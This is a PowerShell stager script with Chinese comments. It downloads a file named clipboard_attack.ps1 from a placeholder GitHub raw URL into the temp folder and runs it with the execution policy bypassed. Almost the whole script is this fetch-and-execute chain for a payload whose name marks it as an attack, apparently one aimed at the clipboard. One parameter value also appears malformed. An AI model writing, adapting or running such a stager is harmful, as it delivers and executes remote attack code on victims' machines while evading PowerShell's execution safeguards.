# 设置目标 URL 和保存文件的路径
$scriptUrl = "https://raw.githubusercontent.com/yourusername/yourrepository/main/clipboard_attack.ps1"  # 修改为你的实际 GitHub raw 链接
$scriptPath = "$env:TEMP\clipboard_attack.ps1"

# 使用 Invoke-WebRequest 下载脚本并显示进度
Write-Host "正在下载脚本...请稍候。"

try {
    # 使用 Invoke-WebRequest 下载脚本并显示进度
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -ProgressAction 'Writing' -ErrorAction Stop

    # 下载完成后，提示文件路径
    Write-Host "脚本下载成功！保存在: $scriptPath"
} catch {
    Write-Host "下载失败: $_"
    exit 1
}

# 确保文件已经成功下载
if (Test-Path $scriptPath) {
    Write-Host "正在执行下载的脚本..."
    # 执行下载的脚本
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -Wait
} else {
    Write-Host "未找到下载的脚本文件。"
}
